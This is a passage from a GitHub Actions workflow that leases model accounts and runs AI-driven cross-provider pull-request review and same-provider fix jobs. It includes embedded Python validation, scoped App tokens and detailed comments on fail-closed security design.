          # parses these `cap=` / `ttl=` literals and its self-test pins them to
          # SELF_CLAIM_REVIEW_CAP / SELF_CLAIM_FIX_CAP and REVIEW_TTL / FIX_TTL. Editing one side
          # only turns that self-test RED — change both, or don't change either.
          if [[ "$MODE" == review ]]; then
            prefix="review:"; cap=10; ttl=4200; role=review
          else
            prefix="fix:"; cap=3; ttl=6300; role=fix
          fi
          holder="$prefix$TARGET_REPO#$PR_NUMBER@$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
          set +e
          python3 registry/scripts/select-and-claim.py \
            --claim \
            --repo "$GITHUB_REPOSITORY" \
            --package "$PACKAGE" \
            --role "$role" \
            --models "$MODELS" \
            --account-pool "$ACCOUNT_POOL" \
            --holder "$holder" \
            --holder-prefix "$prefix" \
            --max-holder-concurrent "$cap" \
            --ttl "$ttl" > "$RUNNER_TEMP/claim.json"
          rc=$?
          set -e
          if [[ "$rc" -eq 3 ]]; then
            printf 'acquired=false\n' >> "$GITHUB_OUTPUT"
            printf 'No eligible account lease is free; deferring without failure.\n'
            exit 0
          fi
          [[ "$rc" -eq 0 ]] || { echo '::error::lease claim failed'; exit "$rc"; }
          python3 - "$RUNNER_TEMP/claim.json" "$ACCOUNT_POOL" "$MODELS" <<'PY'
          import hashlib
          import json
          import os
          import re
          import sys

          claim_path, pool_csv, models_csv = sys.argv[1:]
          with open(claim_path, encoding="utf-8") as handle:
              claim = json.load(handle)
          pool = pool_csv.split(",")
          models = models_csv.split(",")
          mode = os.environ["MODE"]
          impl_provider = os.environ["IMPL_PROVIDER"]
          impl_account_h = os.environ["IMPL_ACCOUNT_H"]
          salt = os.environ.get("PROVENANCE_SALT", "")
          account = claim.get("account")
          model = claim.get("model")
          claim_id = claim.get("claim_id")
          secret_ref = claim.get("secret_ref")
          provider = claim.get("provider") or ""
          if account not in pool or model not in models:
              raise SystemExit("allocator returned an account/model outside resolved policy")
          if not re.fullmatch(r"acct[0-9a-z]{2,}", str(account)):
              raise SystemExit("allocator returned an unsafe account")
          if secret_ref != f"{account.upper()}_TOKEN" or not re.fullmatch(r"[A-Z][A-Z0-9_]*", str(secret_ref)):
              raise SystemExit("allocator returned an unsafe or mismatched secret_ref")
          if not re.fullmatch(r"[0-9a-f]{32}", str(claim_id)):
              raise SystemExit("allocator returned an unsafe claim_id")
          # Fail-closed cross-provider assertions (claim layer, locked decision 6). The account
          # comparison runs on SALTED HASHES (locked decision 22a) because the public provenance
          # record never stores a raw handle; a missing salt fails closed.
          if not provider:
              raise SystemExit("claimed account has no provider metadata; failing closed")
          if mode == "review" and provider == impl_provider:
              raise SystemExit("reviewer provider equals implementer provider; refusing")
          if mode == "review":
              if not salt:
                  raise SystemExit("PROVENANCE_SALT is unavailable; refusing to assert reviewer identity")
              if hashlib.sha256(f"{account}:{salt}".encode()).hexdigest()[:16] == impl_account_h:
                  raise SystemExit("reviewer account equals implementer account; refusing")
          if mode == "fix" and provider != impl_provider:
              raise SystemExit("fixer provider must equal implementer provider; refusing")
          values = {
              "acquired": "true",
              "account": account,
              "claim_id": claim_id,
              "model": model,
              "provider": provider,
              "harness": claim.get("harness") or "",
              "credential_format": claim.get("credential_format") or "",
              "secret_ref": secret_ref,
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  if "\n" in value or "\r" in value:
                      raise SystemExit(f"allocator returned unsafe {key}")
                  output.write(f"{key}={value}\n")
          # Privacy (locked decision 22b): public workflow logs never carry account handles.
          print(f"lease claimed: model={model}, claim={claim_id[:8]}")
          PY

      - name: Adopt dispatcher-owned CAS claim
        id: adopt
        if: ${{ inputs.claim_id != '' && needs.resolve.outputs.already_done != 'true' }}
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          PR_NUMBER: ${{ inputs.pr_number }}
          MODE: ${{ inputs.mode }}
          EXPECTED_ACCOUNT: ${{ inputs.account }}
          CLAIM_ID: ${{ inputs.claim_id }}
          MODELS: ${{ needs.resolve.outputs.model_chain }}
          ACCOUNT_POOL: ${{ needs.resolve.outputs.account_pool }}
          PACKAGE: ${{ needs.resolve.outputs.package }}
          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
          IMPL_ACCOUNT_H: ${{ needs.resolve.outputs.impl_account_h }}
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
        run: |
          set -euo pipefail
          prefix="review:"
          [[ "$MODE" == fix ]] && prefix="fix:"
          python3 registry/scripts/select-and-claim.py \
            --inspect "$CLAIM_ID" \
            --repo "$GITHUB_REPOSITORY" \
            --expected-holder-prefix "$prefix$TARGET_REPO#$PR_NUMBER@" > "$RUNNER_TEMP/adopt.json"
          if ! python3 - "$RUNNER_TEMP/adopt.json" <<'PY'
          import hashlib
          import json
          import os
          import re
          import sys

          with open(sys.argv[1], encoding="utf-8") as handle:
              claim = json.load(handle)
          mode = os.environ["MODE"]
          impl_provider = os.environ["IMPL_PROVIDER"]
          impl_account_h = os.environ["IMPL_ACCOUNT_H"]
          salt = os.environ.get("PROVENANCE_SALT", "")
          account = claim.get("account")
          model = claim.get("model")
          claim_id = claim.get("claim_id")
          secret_ref = claim.get("secret_ref")
          provider = claim.get("provider") or ""
          pool = os.environ["ACCOUNT_POOL"].split(",")
          models = os.environ["MODELS"].split(",")
          if account != os.environ["EXPECTED_ACCOUNT"] or account not in pool:
              raise SystemExit("dispatcher claim account is outside resolved policy")
          if model not in models:
              raise SystemExit("dispatcher claim model is outside resolved routing")
          if claim_id != os.environ["CLAIM_ID"] or not re.fullmatch(r"[0-9a-f]{32}", str(claim_id)):
              raise SystemExit("dispatcher claim id is invalid")
          if claim.get("role") != mode or claim.get("package") != os.environ["PACKAGE"]:
              raise SystemExit("dispatcher claim work partition disagrees with the resolved PR")
          if secret_ref != f"{account.upper()}_TOKEN" or not re.fullmatch(
                  r"[A-Z][A-Z0-9_]*", str(secret_ref)):
              raise SystemExit("dispatcher claim secret_ref is unsafe")
          if not provider:
              raise SystemExit("claimed account has no provider metadata; failing closed")
          if mode == "review" and provider == impl_provider:
              raise SystemExit("reviewer provider equals implementer provider; refusing")
          if mode == "review":
              # Salted-hash account assertion (locked decision 22a); missing salt fails closed.
              if not salt:
                  raise SystemExit("PROVENANCE_SALT is unavailable; refusing to assert reviewer identity")
              if hashlib.sha256(f"{account}:{salt}".encode()).hexdigest()[:16] == impl_account_h:
                  raise SystemExit("reviewer account equals implementer account; refusing")
          if mode == "fix" and provider != impl_provider:
              raise SystemExit("fixer provider must equal implementer provider; refusing")
          values = {
              "acquired": "true",
              "account": account,
              "claim_id": claim_id,
              "model": model,
              "provider": provider,
              "harness": claim.get("harness") or "",
              "credential_format": claim.get("credential_format") or "",
              "secret_ref": secret_ref,
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  if not isinstance(value, str) or "\n" in value or "\r" in value:
                      raise SystemExit(f"dispatcher claim returned unsafe {key}")
                  output.write(f"{key}={value}\n")
          # Privacy (locked decision 22b): public workflow logs never carry account handles.
          print(f"dispatcher lease adopted: model={model}, claim={claim_id[:8]}")
          PY
          then
            python3 registry/scripts/select-and-claim.py \
              --release "$CLAIM_ID" \
              --repo "$GITHUB_REPOSITORY" || true
            exit 1
          fi

  run:
    name: Run ${{ inputs.mode }} on PR ${{ inputs.pr_number }}
    needs: [resolve, claim]
    if: ${{ needs.claim.outputs.acquired == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: ${{ inputs.mode == 'review' && 25 || 60 }}
    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY + the per-account
    # secrets[secret_ref] credential, which live in the `dispatch-secrets` environment
    # (deployment-branch policy: default branch only) — full rationale on the `claim` job in
    # dispatch.yml.
    environment: dispatch-secrets
    permissions:
      # READ ONLY — in fix mode this job executes model-authored target code HOST-side (the
      # cargo gate), so no registry-WRITE token may exist anywhere in its blast radius. The
      # registry verdict record, PR label/marker mutations, arming, and escalations all happen
      # in the separate `outcome` job below, which executes no target code.
      contents: read
    outputs:
      # [registry #972] The target-identity refusal CODE, or empty. Non-empty means this run was
      # refused BEFORE the reviewer launched and the refusal is DETERMINISTIC (the gate reads the
      # target repo, this App's login and the PR author — a re-dispatch changes none of them), so
      # the `outcome` job must record a terminal, counted outcome instead of leaving the world
      # unchanged for the next tick to re-dispatch into. Bound from a step that SUCCEEDS.
      identity_refusal: ${{ steps.target.outputs.refusal }}
      reviewed_sha: ${{ steps.review.outputs.reviewed_sha }}
      verdict_ok: ${{ steps.verdict.outcome }}
      verdict_b64: ${{ steps.handoff.outputs.verdict_b64 }}
      files_b64: ${{ steps.handoff.outputs.files_b64 }}
      fix_done: ${{ steps.fix.outcome }}
      # Issue #560: whether the recorded verdict was STAGED for the fixer, and the reason it was
      # not. staged=false means this run produced NOTHING — no fix, no push, no verdict — because
      # no recorded verdict is bound to the live head. The `outcome` job must then hand the PR from
      # the FIX lane to the REVIEW lane, or fix-enumeration (which keys on review:changes) re-claims
      # it on every ~8min dispatch tick while review-enumeration (review:needs) never sees it.
      # Empty in review mode and for the ci/rebase repair flavours (stage-verdict is skipped there).
      verdict_staged: ${{ steps.stage-verdict.outputs.staged }}
      verdict_stale_reason: ${{ steps.stage-verdict.outputs.stale_reason }}
      fix_made_changes: ${{ steps.fix.outputs.fix_made_changes }}
      injection_detected: ${{ steps.fix.outputs.injection_detected }}
      gate_outcome: ${{ steps.gate.outcome }}
      # [issue #91 review r2] The fix COMMIT, sealed and recorded BEFORE the hostile gate step
      # starts, and the second parent a conflict repair merged. The runner captures these step
      # outputs while this runner is still clean, so nothing the gate does can alter them; the
      # isolated `publish` job below binds the bundle it downloads to this SHA before it pushes.
      # `pushed`/`pushed_sha` moved to that job with the push itself.
      staged_sha: ${{ steps.stage.outputs.staged_sha }}
      staged_merge_head: ${{ steps.stage.outputs.staged_merge_head }}
      # Host-derived target identity, bound by the pre-model `target` step from this App's own
      # `/users/<slug>[bot]` record and the target repo record — never from PR text. The publisher
      # re-asserts the staged commit's committer against this and does not have to trust the
      # bundle for it.
      target_bot_login: ${{ steps.target.outputs.bot_login }}
      target_default_branch: ${{ steps.target.outputs.default_branch }}
      # Model-access health (registry #32): the sanitized exit CLASS of the review/fix model launch,
      # recorded by the separate no-target-code `model_health` job (success or failure), plus the
      # sanitized session-limit reset time (review defect #9; empty for every other class).
      exit_class: ${{ steps.exit-class.outputs.class }}
      reset_hint: ${{ steps.exit-class.outputs.reset_hint }}
      # THIS job's run attempt, stamped beside the class (review round 1 of #425): the recorder's
      # idempotency key must track the attempt that PRODUCED the outcome, not the recorder's own.
      # A recorder-only retry replays this preserved output (same attempt -> dedup no-op); a full
      # re-run re-executes this job and stamps a fresh attempt, so its genuinely new outcome
      # still counts toward backoff/outage thresholds.
      outcome_attempt: ${{ steps.exit-class.outputs.outcome_attempt }}
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      # Verdict records are staged from the unprotected `ledger` data-plane branch first
      # (issue #96 — post-outage records land only there); the master checkout keeps the
      # pre-outage copies. Fails the job LOUDLY if the ledger branch is missing.
      - name: Checkout the data-plane ledger branch (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: ledger
          ref: ledger
          persist-credentials: false

      # Validate paths, object types, and modes against the canonical data-only allowlist.
      - name: Ledger checkout is data-only (trust guard)
        run: python3 registry/scripts/ledger-invariant.py ledger

      # Per-phase least-privilege App tokens. The REVIEW token cannot write target contents (the
      # reviewer never pushes); the FIX token can (it pushes the fix commit). The ARM path mints
      # its own token in the separate `outcome` job only when the verdict approves. No token
      # ever enters the model container in any mode.
      - name: Mint review-scoped App token (no target contents write)
        id: app-token-review
        if: ${{ inputs.mode == 'review' }}
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: read
          permission-issues: write
          permission-pull-requests: write

      # [issue #91 review r2] NO TARGET CONTENTS WRITE — this token used to carry
      # contents+workflows write so the post-gate `push` step could use it, which put a
      # push-capable credential in the same job as target-controlled gate code. The push moved to
      # the isolated `publish` job, which mints those scopes on a runner that has never executed
      # target code; what remains here is what the PRE-gate steps actually need (identity probe,
      # target checkout, round record, follow-up issues).
      - name: Mint fix-scoped App token (no target contents write)
        id: app-token-fix
        if: ${{ inputs.mode == 'fix' }}
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: read
          permission-issues: write
          permission-pull-requests: write

      - name: Verify target App identity and default branch
        id: target
        env:
          GH_TOKEN: ${{ steps.app-token-review.outputs.token || steps.app-token-fix.outputs.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          APP_SLUG: ${{ steps.app-token-review.outputs.app-slug || steps.app-token-fix.outputs.app-slug }}
          PR_AUTHOR: ${{ needs.resolve.outputs.pr_author }}
        run: |
          set -euo pipefail
          [[ -n "$GH_TOKEN" ]] || { echo '::error::target App token was not minted'; exit 1; }
          [[ -n "$APP_SLUG" ]] || { echo '::error::app slug was not resolved'; exit 1; }
          printf '::add-mask::%s\n' "$GH_TOKEN"
          gh api "repos/$TARGET_REPO" > "$RUNNER_TEMP/target.json"
          gh api "/users/${APP_SLUG}[bot]" > "$RUNNER_TEMP/app-user.json"
          python3 - "$RUNNER_TEMP/target.json" "$RUNNER_TEMP/app-user.json" <<'PY'
          import json
          import os
          import re
          import sys

          with open(sys.argv[1], encoding="utf-8") as handle:
              repo = json.load(handle)
          with open(sys.argv[2], encoding="utf-8") as handle:
              user = json.load(handle)

          # [registry #972] A REFUSAL MUST RECORD ITSELF. Every predicate below still refuses
          # exactly what it refused before — none of them is widened, and the model still never
          # runs — but the refusal now names a CODE from worker-pr.IDENTITY_REFUSAL_REASONS and
          # leaves this step at exit 0 WITHOUT binding `bot_login`, so the next step (which fails
          # the job) and the `outcome` job can both see it. Until this, the refusal raised, the
          # `run` job died, the `outcome` job's `if:` went unsatisfied, and NOTHING durable was
          # written — so the next dispatch tick re-derived a byte-identical world and re-launched
          # the identical run, forever. Measured on this registry's own PR #961 (review run
          # 30340804869: `Apply outcome` SKIPPED).
          #
          # The FAIL DIRECTION is unchanged and is enforced by the NEXT step, not by this one:
          # `bot_login` is written on the success path ALONE, and the next step fails the job
          # whenever it is empty. So every exit from this block that is not a full pass — a
          # refusal, an exception, a `refuse()` whose code was mistyped — stops the run.
          def refuse(code):
              with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as handle:
                  handle.write(f"refusal={code}\n")
              print(f"::error::target identity refused: {code}")
              raise SystemExit(0)

          if repo.get("full_name") != os.environ["TARGET_REPO"]:
              refuse("wrong-target")
          default_branch = repo.get("default_branch")
          login = user.get("login")
          user_id = str(user.get("id", ""))
          if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", str(default_branch)):
              refuse("unsafe-default-branch")
          if not re.fullmatch(r"[A-Za-z0-9_.-]+\[bot\]", str(login)) or not user_id.isdigit():
              refuse("not-an-app-bot")
          # Authoritative authorship check: the PR must be authored by THIS App bot — a spoofed
          # bot-suffixed author from some other App never reaches the model. DELIBERATELY NOT
          # WIDENED for the #657 self-attested class (research/657-orchestrator-pr-admission.md
          # §9.5 item 1): handing a target-scoped App token to a model on a PR this App did not
          # author is a security-posture decision, not a shape widening. #972 fixes the missing
          # EXIT, not the gate.
          if os.environ["PR_AUTHOR"] != login:
              refuse("author-not-app-bot")
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              output.write(f"default_branch={default_branch}\n")
              output.write(f"bot_login={login}\n")
              output.write(f"bot_id={user_id}\n")
          print(f"target token verified for {repo['full_name']} at {default_branch}")
          PY

      # [registry #972] THE REFUSAL, made to fail the job from a step whose predecessor SUCCEEDED
      # — which is what makes `steps.target.outputs.refusal` reliably readable as a job output.
      #
      # FAIL-CLOSED BY CONSTRUCTION: the only value that lets the run continue is a NON-EMPTY
      # `bot_login`, and the step above writes that on its success path alone, after every
      # predicate has passed. So this condition cannot become an admission hole in the direction
      # that matters — getting it wrong stops the run, it never starts one. No `always()`: a step
      # above that CRASHED (a network read, a malformed payload) is a TRANSIENT, the job is
      # already failing, and a transient must keep its retry-next-tick behaviour rather than
      # earning a terminal park.
      - name: Refuse the run when the target App identity did not verify
        if: ${{ steps.target.outputs.bot_login == '' }}
        env:
          REFUSAL: ${{ steps.target.outputs.refusal }}
        run: |
          echo "::error::the target App identity gate refused this run (${REFUSAL:-unverified});" \
               "the outcome job records it as a terminal, counted refusal"
          exit 1

      - name: Checkout target default branch with scoped App token (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          repository: ${{ inputs.target_repo }}
          ref: ${{ steps.target.outputs.default_branch }}
          path: target
          token: ${{ steps.app-token-review.outputs.token || steps.app-token-fix.outputs.token }}
          fetch-depth: 0
          persist-credentials: false

      - name: Resolve claimed account to concrete target model
        id: selected
        env:
          ROUTING_PATH: ${{ needs.resolve.outputs.routing }}
          LIVE_ACCOUNT: ${{ needs.claim.outputs.account }}
          LIVE_MODEL: ${{ needs.claim.outputs.model }}
          LIVE_PROVIDER: ${{ needs.claim.outputs.provider }}
          LIVE_HARNESS: ${{ needs.claim.outputs.harness }}
          LIVE_CREDENTIAL_FORMAT: ${{ needs.claim.outputs.credential_format }}
          LIVE_SECRET_REF: ${{ needs.claim.outputs.secret_ref }}
        run: |
          python3 - <<'PY'
          import os
          from pathlib import Path, PurePosixPath
          import re
          import tomllib

          target_root = Path(os.environ["GITHUB_WORKSPACE"], "target").resolve()
          routing_path = target_root.joinpath(*PurePosixPath(os.environ["ROUTING_PATH"]).parts).resolve()
          try:
              routing_path.relative_to(target_root)
          except ValueError as exc:
              raise SystemExit("resolved routing path escaped target checkout") from exc
          with open(routing_path, "rb") as handle:
              routing = tomllib.load(handle)

          account = os.environ["LIVE_ACCOUNT"]
          model = os.environ["LIVE_MODEL"]
          secret_ref = os.environ["LIVE_SECRET_REF"]
          meta = routing.get("models", {}).get(model)
          if not isinstance(meta, dict):
              raise SystemExit("claimed model is missing from protected target routing")
          # A codex alias may leave provider_model unset/TBD (locked decision 14): worker-live.sh
          # then omits --model and the codex CLI default applies (the proven drain posture).
          provider_model = meta.get("provider_model")
          if meta.get("harness") == "codex" and provider_model in (None, "", "TBD"):
              provider_model = "TBD"
          values = {
              "account": account,
              "model": model,
              "provider": meta.get("provider"),
              "harness": meta.get("harness"),
              "provider_model": provider_model,
              "credential_format": meta.get("credential_format"),
              "secret_ref": secret_ref,
          }
          if (values["provider"], values["harness"]) not in {
              ("openai", "codex"), ("anthropic", "claude")
          }:
              raise SystemExit("claimed model has an unsupported provider/harness pair")
          if values["credential_format"] not in {
              "codex-auth-json", "claude-credentials-json", "claude-oauth-token", "anthropic-api-key"
          }:
              raise SystemExit("claimed model has an unsupported credential format")
          for env_key, meta_key in (("LIVE_PROVIDER", "provider"), ("LIVE_HARNESS", "harness"),
                                    ("LIVE_CREDENTIAL_FORMAT", "credential_format")):
              claimed = os.environ[env_key]
              if claimed and claimed != values[meta_key]:
                  raise SystemExit(f"claimed account {meta_key} conflicts with protected routing")
          if not re.fullmatch(r"acct[0-9a-z]{2,}", str(account)):
              raise SystemExit("unsafe selected account")
          if secret_ref != f"{account.upper()}_TOKEN" or not re.fullmatch(r"[A-Z][A-Z0-9_]*", str(secret_ref)):
              raise SystemExit("unsafe selected secret_ref")
          for key, value in values.items():
              if not isinstance(value, str) or not value or "\n" in value or "\r" in value:
                  raise SystemExit(f"unsafe or missing selected value: {key}")
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  output.write(f"{key}={value}\n")
          # Privacy (locked decision 22b): public workflow logs never carry account handles.
          print(f"selected account resolved: model={model}, harness={values['harness']}")
          PY

      - name: Prepare isolated selected-account environment
        id: prepare
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_ACCOUNT: ${{ steps.selected.outputs.account }}
          WORKER_ACCOUNT_CREDENTIAL: ${{ secrets[steps.selected.outputs.secret_ref] }}
          WORKER_PROVIDER: ${{ steps.selected.outputs.provider }}
          WORKER_HARNESS: ${{ steps.selected.outputs.harness }}
          WORKER_CREDENTIAL_FORMAT: ${{ steps.selected.outputs.credential_format }}
        run: bash registry/scripts/worker-prep.sh

      # ---- mode=review: read-only opposite-provider review ----
      # The round marker is recorded BEFORE the model runs so a review that crashes at the model
      # call still consumes budget: a deterministic crash re-claims at most max_review_rounds
      # times and then escalates to needs-user via the sweep — never an unbounded
      # re-claim/re-crash loop. Idempotent per run key (a re-run of this run records nothing new).
      # Issue #162: the marker binds the head sha it reviews (--head-sha) so a review that DEFERS
      # as stale (the live head moved off this commit) is voided by the outcome step and not
      # charged — legitimate head churn no longer burns the global round budget. A crash (no
      # outcome step) records no void and stays charged, so the crash bound is unchanged.
      - name: Record the review round before the model runs (bounded-crash accounting)
        id: round
        if: ${{ inputs.mode == 'review' && steps.prepare.outcome == 'success' }}
        env:
          GH_TOKEN: ${{ steps.app-token-review.outputs.token }}
        run: |
          python3 registry/scripts/worker-pr.py round-record \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --round "${{ inputs.review_round }}" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --head-sha "${{ needs.resolve.outputs.head_sha }}" \
            --bot-login "${{ steps.target.outputs.bot_login }}"

      # Prior-round context for the progress grade (maintainer directive 2026-07-17): the
      # reviewer must compare this round's findings against the PRIOR round's recorded findings
      # and grade improving/stagnant/regressing. The registry verdict record is the trusted,
      # schema-validated source (the same findings sit in the PR round comments, but the
      # reviewer container has no GitHub access). Round 1 has no prior round, and a missing
      # record degrades to progress=null — never a failure.
      - name: Stage the prior-round verdict for the progress assessment
        id: stage-prior
        if: ${{ inputs.mode == 'review' && inputs.review_round != '1' && steps.round.outcome == 'success' }}
        env:
          TARGET_REPO: ${{ inputs.target_repo }}
          REVIEW_ROUND: ${{ inputs.review_round }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
        run: |
          set -euo pipefail
          owner="${TARGET_REPO%%/*}"
          name="${TARGET_REPO##*/}"
          prior=$((REVIEW_ROUND - 1))
          # Ledger-branch record first (issue #96), legacy master-checkout copy as fallback.
          record="ledger/orchestration/review-verdicts/${owner}--${name}--pr${{ inputs.pr_number }}-round${prior}.json"
          [[ -f "$record" ]] || record="registry/orchestration/review-verdicts/${owner}--${name}--pr${{ inputs.pr_number }}-round${prior}.json"
          if [[ -f "$record" ]]; then
            install -m 600 "$record" "$WORKER_ROOT/prior-verdict.json"
            printf 'staged the round %s verdict for the progress comparison\n' "$prior"
          else
            printf '::warning::no registry verdict record for prior round %s; the reviewer will report progress=null\n' "$prior"
          fi

      - name: Run cross-provider review (read-only, verdict file lifted out-of-tree)
        id: review
        if: ${{ inputs.mode == 'review' && steps.round.outcome == 'success' }}
        working-directory: target
        env:
          TARGET_DIR: ${{ github.workspace }}/target
          TARGET_REPO: ${{ inputs.target_repo }}
          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_PR_NUMBER: ${{ inputs.pr_number }}
          WORKER_PR_HEAD_BRANCH: ${{ needs.resolve.outputs.head_branch }}
          WORKER_PR_HEAD_SHA: ${{ needs.resolve.outputs.head_sha }}
          WORKER_REVIEW_FILE: ${{ runner.temp }}/registry-worker/review-verdict.json
          WORKER_REVIEW_ROUND: ${{ inputs.review_round }}
          WORKER_PRIOR_REVIEW_FILE: ${{ runner.temp }}/registry-worker/prior-verdict.json
          WORKER_IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
          WORKER_IMPL_ALIAS: ${{ needs.resolve.outputs.impl_alias }}
          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
          WORKER_PROVIDER_MODEL: ${{ steps.selected.outputs.provider_model }}
          WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
          # [issue #232] The reviewer's own account credential reaches the harness HERE and only
          # here (plus the write-back below) — worker-prep no longer persists the path, the account
          # handle or the isolated HOME into the job-wide $GITHUB_ENV, where the fix-mode gate's
          # target-controlled cargo would inherit them. WORKER_PROVIDER is the REVIEWER's provider:
          # worker-live.sh refuses the run unless it differs from the implementer's.
          WORKER_PROVIDER: ${{ steps.selected.outputs.provider }}
          WORKER_HARNESS: ${{ steps.selected.outputs.harness }}
          WORKER_CREDENTIAL_FORMAT: ${{ steps.selected.outputs.credential_format }}
          WORKER_CREDENTIAL_PATH: ${{ steps.prepare.outputs.credential_path }}
        run: bash ../registry/scripts/worker-live.sh review

      - name: Schema-validate the lifted verdict (host-side, no tokens)
        id: verdict
        if: ${{ inputs.mode == 'review' && steps.review.outcome == 'success' }}
        run: |
          python3 registry/scripts/worker-pr.py validate-verdict \
            --verdict-file "$RUNNER_TEMP/registry-worker/review-verdict.json" \
            --files-file "$RUNNER_TEMP/registry-worker/pr-files.txt"

      # The verdict crosses to the `outcome` job as VALIDATED, size-capped data (never via the
      # registry checkout of THIS job): the outcome job re-validates it on a fresh checkout
      # before any token touches it.
      - name: Surface the validated verdict for the outcome job (no tokens)
        id: handoff
        if: ${{ inputs.mode == 'review' && steps.verdict.outcome == 'success' }}
        run: |
          set -euo pipefail
          verdict="$RUNNER_TEMP/registry-worker/review-verdict.json"
          files="$RUNNER_TEMP/registry-worker/pr-files.txt"
          # The schema caps the verdict (<=10 capped issues); the diff FILE LIST is bounded here
          # so a pathological PR cannot blow the 1MB job-output ceiling.
          [[ "$(wc -c < "$verdict")" -le 262144 ]] || { echo '::error::verdict exceeds size cap'; exit 1; }
          [[ "$(wc -c < "$files")" -le 262144 ]] || { echo '::error::diff file list exceeds size cap'; exit 1; }
          printf 'verdict_b64=%s\n' "$(base64 -w0 "$verdict")" >> "$GITHUB_OUTPUT"
          printf 'files_b64=%s\n' "$(base64 -w0 "$files")" >> "$GITHUB_OUTPUT"

      # ---- mode=fix: same-provider fix seeded with the registry-recorded verdict (kind=verdict
      # only; the ci/rebase repair flavours build their own context and need no verdict) ----
      - name: Stage the registry-recorded verdict for the fixer
        id: stage-verdict
        if: ${{ inputs.mode == 'fix' && inputs.fix_kind != 'ci' && inputs.fix_kind != 'rebase' && steps.prepare.outcome == 'success' }}
        env:
          TARGET_REPO: ${{ inputs.target_repo }}
          REVIEW_ROUND: ${{ inputs.review_round }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          # Issue #156: the head the fixer is about to check out and edit. stage-verdict only
          # unwraps the recorded verdict when its host envelope binds it to THIS sha; a stale or
          # legacy-unbound record sets staged=false and the fix step below skips (the sweep
          # re-reviews the advanced head) — the fixer is never seeded against unreviewed code.
          EXPECTED_SHA: ${{ needs.resolve.outputs.head_sha }}
        run: |
          set -euo pipefail
          owner="${TARGET_REPO%%/*}"
          name="${TARGET_REPO##*/}"
          # Ledger-branch record first (issue #96), legacy master-checkout copy as fallback.
          record="ledger/orchestration/review-verdicts/${owner}--${name}--pr${{ inputs.pr_number }}-round${REVIEW_ROUND}.json"
          [[ -f "$record" ]] || record="registry/orchestration/review-verdicts/${owner}--${name}--pr${{ inputs.pr_number }}-round${REVIEW_ROUND}.json"
          [[ -f "$record" ]] || { echo "::error::no registry verdict record for round $REVIEW_ROUND"; exit 1; }
          # The sha alone is not identity — the record's envelope must ALSO name exactly this
          # dispatch's repo/PR/round (a same-commit record for another PR or round sets
          # staged=false and the fix step below skips).
          python3 registry/scripts/worker-pr.py stage-verdict \
            --record-file "$record" \
            --out-file "$WORKER_ROOT/review-verdict.json" \
            --expected-sha "$EXPECTED_SHA" \
            --target-repo "$TARGET_REPO" \
            --pr "${{ inputs.pr_number }}" \
            --round "$REVIEW_ROUND"

      - name: Run same-provider fix (findings framed as untrusted data)
        id: fix
        # kind=verdict requires the verdict STAGED against the live head (issue #156:
        # staged=false means the record was stale/unbound — skip so the sweep re-reviews); the
        # ci/rebase flavours run whenever prepare succeeded (stage-verdict is skipped for them).
        if: ${{ inputs.mode == 'fix' && steps.prepare.outcome == 'success' && (steps.stage-verdict.outcome == 'skipped' || steps.stage-verdict.outputs.staged == 'true') }}
        working-directory: target
        env:
          TARGET_DIR: ${{ github.workspace }}/target
          TARGET_REPO: ${{ inputs.target_repo }}
          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_PR_NUMBER: ${{ inputs.pr_number }}
          WORKER_PR_HEAD_BRANCH: ${{ needs.resolve.outputs.head_branch }}
          WORKER_PR_HEAD_SHA: ${{ needs.resolve.outputs.head_sha }}
          WORKER_REVIEW_FILE: ${{ runner.temp }}/registry-worker/review-verdict.json
          WORKER_FIX_ROUND: ${{ inputs.review_round }}
          WORKER_FIX_KIND: ${{ inputs.fix_kind }}
